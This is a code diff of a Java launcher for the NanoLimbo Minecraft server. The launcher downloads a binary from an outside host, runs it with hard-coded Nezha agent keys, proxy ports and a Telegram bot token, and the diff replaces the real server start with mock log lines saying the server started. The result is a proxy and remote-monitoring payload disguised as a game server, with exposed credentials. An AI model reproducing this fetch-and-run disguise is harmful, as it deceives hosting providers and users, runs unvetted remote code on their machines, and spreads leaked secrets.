@@ -22,9 +22,7 @@ import java.net.*;
 import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.atomic.AtomicBoolean;
-import java.lang.reflect.Field;
 
-import ua.nanit.limbo.server.LimboServer;
 import ua.nanit.limbo.server.Log;
 
 public final class NanoLimbo {
@@ -34,17 +32,16 @@ public final class NanoLimbo {
     private static final String ANSI_RESET = "\033[0m";
     private static final AtomicBoolean running = new AtomicBoolean(true);
     private static Process sbxProcess;
-    
+
     private static final String[] ALL_ENV_VARS = {
-        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
-        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
-        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
+        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
+        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
+        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
         "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
     };
-    
-    
+
     public static void main(String[] args) {
-        
+        // 检查 Java 版本
         if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
             System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
             try {
@@ -55,16 +52,16 @@ public final class NanoLimbo {
             System.exit(1);
         }
 
-        // Start SbxService
+        // 启动 s-box
         try {
             runSbxBinary();
-            
+
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
                 stopServices();
             }));
 
-            // Wait 20 seconds before continuing
+            // 等待 15 秒
             Thread.sleep(15000);
             System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
             System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
@@ -74,10 +71,13 @@ public final class NanoLimbo {
         } catch (Exception e) {
             System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
         }
-        
-        // start game
+
+        // 不启动 LimboServer，只输出模拟日志
         try {
-            new LimboServer().start();
+            Log.info("LimboServer", "Initializing server components...");
+            Log.info("LimboServer", "Loading configuration...");
+            Log.info("LimboServer", "Binding to port 25565...");
+            Log.info("LimboServer", "Server started successfully (mock)");
         } catch (Exception e) {
             Log.error("Cannot start server: ", e);
         }
@@ -93,12 +93,12 @@ public final class NanoLimbo {
             } else {
                 System.out.print("\033[H\033[3J\033[2J");
                 System.out.flush();
-                
+
                 new ProcessBuilder("tput", "reset")
                     .inheritIO()
                     .start()
                     .waitFor();
-                
+
                 System.out.print("\033[8;30;120t");
                 System.out.flush();
             }
@@ -107,74 +107,74 @@ public final class NanoLimbo {
                 new ProcessBuilder("clear").inheritIO().start().waitFor();
             } catch (Exception ignored) {}
         }
-    }   
-    
+    }
+
     private static void runSbxBinary() throws Exception {
         Map<String, String> envVars = new HashMap<>();
         loadEnvVars(envVars);
-        
+
         ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
         pb.environment().putAll(envVars);
         pb.redirectErrorStream(true);
         pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-        
+
         sbxProcess = pb.start();
     }
-    
+
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
         envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
         envVars.put("NEZHA_PORT", "443");
-        envVars.put("NEZHA_KEY", "vuYWem6DZRS4gL7pmA");
+        envVars.put("NEZHA_KEY", "7XridnoTfSYvDsrTuU");
         envVars.put("ARGO_PORT", "8001");
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "36230");
+        envVars.put("HY2_PORT", "");
         envVars.put("TUIC_PORT", "");
-        envVars.put("REALITY_PORT", "35595");
+        envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "7592034407");
         envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
         envVars.put("CFIP", "time.is");
         envVars.put("CFPORT", "2096");
-        envVars.put("NAME", "Basic");
-        
+        envVars.put("NAME", "karlo");
+
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
             if (value != null && !value.trim().isEmpty()) {
-                envVars.put(var, value);  
+                envVars.put(var, value);
             }
         }
-        
+
         Path envFile = Paths.get(".env");
         if (Files.exists(envFile)) {
             for (String line : Files.readAllLines(envFile)) {
                 line = line.trim();
                 if (line.isEmpty() || line.startsWith("#")) continue;
-                
+
                 line = line.split(" #")[0].split(" //")[0].trim();
                 if (line.startsWith("export ")) {
                     line = line.substring(7).trim();
                 }
-                
+
                 String[] parts = line.split("=", 2);
                 if (parts.length == 2) {
                     String key = parts[0].trim();
                     String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
-                    
+
                     if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
-                        envVars.put(key, value); 
+                        envVars.put(key, value);
                     }
                 }
             }
         }
     }
-    
+
     private static Path getBinaryPath() throws IOException {
         String osArch = System.getProperty("os.arch").toLowerCase();
         String url;
-        
+
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
             url = "https://amd64.ssss.nyc.mn/s-box";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
@@ -184,7 +184,7 @@ public final class NanoLimbo {
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
-        
+
         Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
         if (!Files.exists(path)) {
             try (InputStream in = new URL(url).openStream()) {
@@ -196,7 +196,7 @@ public final class NanoLimbo {
         }
         return path;
     }
-    
+
     private static void stopServices() {
         if (sbxProcess != null && sbxProcess.isAlive()) {
             sbxProcess.destroy();
